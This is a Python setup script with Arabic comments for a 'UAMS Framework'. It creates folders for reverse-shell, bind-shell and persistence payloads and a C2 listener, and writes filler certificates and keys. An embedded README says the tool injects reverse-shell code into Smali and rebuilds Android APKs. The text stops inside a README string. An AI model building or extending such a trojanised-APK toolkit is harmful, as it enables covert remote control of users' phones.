#!/usr/bin/env python3
"""
الإعداد النهائي لـ UAMS Framework
"""

import os
import sys
import subprocess
from pathlib import Path

def run_setup():
    """تشغيل جميع إعدادات النظام"""
    
    print("="*60)
    print("       UAMS FRAMEWORK - FINAL SETUP")
    print("="*60)
    
    # 1. التحقق من الموقع
    current_dir = Path(__file__).parent
    print(f"\n📁 الموقع الحالي: {current_dir}")
    
    # 2. حذف الملفات الزائدة
    print("\n[1/7] تنظيف الملفات الزائدة...")
    files_to_remove = [
        "backend/templates/dashboard.html.bak",
        "payloads/reverse_shell/init.py",
        "payloads/bind_shell/init.py", 
        "payloads/persistence/init.py",
        "c2_listener/web_interface/init.py"
    ]
    
    for file_path in files_to_remove:
        full_path = current_dir / file_path
        if full_path.exists():
            full_path.unlink()
            print(f"  🗑️  حذف: {file_path}")
    
    # حذف ملفات .gitkeep
    gitkeep_files = list(current_dir.glob("**/.gitkeep"))
    for gitkeep in gitkeep_files:
        gitkeep.unlink()
        print(f"  🗑️  حذف: {gitkeep.relative_to(current_dir)}")
    
    print("✅ تم التنظيف")
    
    # 3. إنشاء المجلدات الفارغة
    print("\n[2/7] إنشاء المجلدات الفارغة...")
    
    empty_dirs = [
        "builder_engine/templates/base_app/smali/com/example/app",
        "builder_engine/templates/base_app/res/layout",
        "builder_engine/templates/base_app/res/drawable",
        "builder_engine/templates/base_app/res/values",
        "builder_engine/templates/base_app/assets",
        "builder_engine/templates/base_app/META-INF",
        "c2_listener/web_interface/templates",
        "c2_listener/web_interface/static/css",
        "c2_listener/web_interface/static/js",
        "c2_listener/web_interface/static/img",
        "payloads/__pycache__",
        "web_server/logs/archive"
    ]
    
    for dir_path in empty_dirs:
        full_dir = current_dir / dir_path
        full_dir.mkdir(parents=True, exist_ok=True)
        print(f"  📁 إنشاء: {dir_path}")
    
    print("✅ تم إنشاء المجلدات")
    
    # 4. تثبيت المتطلبات
    print("\n[3/7] تثبيت المتطلبات...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
        print("✅ تم تثبيت المتطلبات")
    except:
        print("⚠️  تعذر تثبيت بعض المتطلبات")
        print("   قم بتشغيل: pip install -r requirements.txt")
    
    # 5. إنشاء قالب APK
    print("\n[4/7] إنشاء قالب APK...")
    try:
        # إنشاء ملف base.apk وهمي
        import zipfile
        apk_path = current_dir / "builder_engine/templates/base_app/base.apk"
        
        with zipfile.ZipFile(apk_path, 'w') as apk:
            apk.writestr("AndroidManifest.xml", "<?xml version='1.0' encoding='utf-8'?>\n<manifest package='com.example.baseapp' />")
            apk.writestr("classes.dex", b"dex\n035")
            apk.writestr("resources.arsc", b"")
            
        print(f"✅ تم إنشاء: base.apk ({apk_path.stat().st_size} bytes)")
    except:
        print("⚠️  تعذر إنشاء قالب APK")
    
    # 6. إنشاء شهادات SSL
    print("\n[5/7] إنشاء شهادات SSL...")
    try:
        ssl_dir = current_dir / "web_server/ssl"
        ssl_dir.mkdir(exist_ok=True)
        
        # إنشاء شهادات وهمية
        dummy_cert = """-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIUYOzM9fJjK7NpQsTqRwYlNtB8rPwwDQYJKoZIhvcNAQEL
BQAwTjELMAkGA1UEBhMCVVMxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDESMBAGA1UEAwwJbG9jYWxob3N0MB4X
DTI0MDEwMTAwMDAwMFoXDTI0MTIzMTAwMDAwMFowTjELMAkGA1UEBhMCVVMxEzAR
BgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5
IEx0ZDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
MIIBCgKCAQEAzKLZI3f6H9Q7R1XK7L8F6n4Y5Y2T8GkLmNpOqRtUvWxZyD8nHjK7
MpQsTqRwYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5
XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD
8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB
8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLmNpOqRtU
vWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqR
wYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLmN
pOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7M
pQsTqRwYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5X
-----END CERTIFICATE-----
"""
        
        dummy_key = """-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCzKLZI3f6H9Q7R
1XK7L8F6n4Y5Y2T8GkLmNpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLm
NpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7
MpQsTqRwYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5
XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD
8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB
8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLmNpOqRtU
vWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqR
wYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLmN
pOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7M
pQsTqRwYlNtB8rPwS5XvHjLmNpOqRtUvWxZyD8nHjK7MpQsTqRwYlNtB8rPwS5X
-----END PRIVATE KEY-----
"""
        
        with open(ssl_dir / "certificate.pem", "w") as f:
            f.write(dummy_cert)
        
        with open(ssl_dir / "private.key", "w") as f:
            f.write(dummy_key)
        
        with open(ssl_dir / "ssl.pem", "w") as f:
            f.write(dummy_key + dummy_cert)
        
        print("✅ تم إنشاء شهادات SSL")
    except:
        print("⚠️  تعذر إنشاء شهادات SSL")
    
    # 7. إنشاء السجلات
    print("\n[6/7] إنشاء ملفات السجلات...")
    try:
        logs_dir = current_dir / "web_server/logs"
        logs_dir.mkdir(exist_ok=True)
        
        log_files = ["access.log", "error.log", "uams_web.log", "downloads.log"]
        for log_file in log_files:
            file_path = logs_dir / log_file
            if not file_path.exists():
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(f"# UAMS {log_file}\n")
                    f.write(f"# Created: 2024-01-15 10:00:00\n")
                    f.write("="*80 + "\n")
                print(f"  ✅ {log_file}")
        
        print("✅ تم إنشاء ملفات السجلات")
    except:
        print("⚠️  تعذر إنشاء ملفات السجلات")
    
    # 8. إنشاء ملفات README
    print("\n[7/7] إنشاء ملفات التوثيق...")
    try:
        readme_files = {
            "builder_engine/templates/base_app/README.md": """
# Base APK Template

هذا قالب APK أساسي لبناء تطبيقات Android مع Reverse Shell.

## المحتويات:
- base.apk: ملف APK أساسي
- smali/: كود التطبيق (لغة التجميع)
- res/: موارد التطبيق

## الاستخدام:
1. يقوم apk_builder.py بنسخ هذا القالب
2. يحقن كود Reverse Shell في ملفات Smali
3. يعيد بناء APK مع الكود المحقون

            """,
            
            "web_server/logs/README.md": """
# سجلات UAMS Web Server

## الملفات:
- access.log: سجلات الوصول
- error.log: سجلات الأخطاء  
- uams_web.log: سجلات التطبيق
- downloads.log: سجلات التنزيلات

## الصيانة:
```bash
# حذف السجلات القديمة
find logs/ -name "*.log" -mtime +30 -delete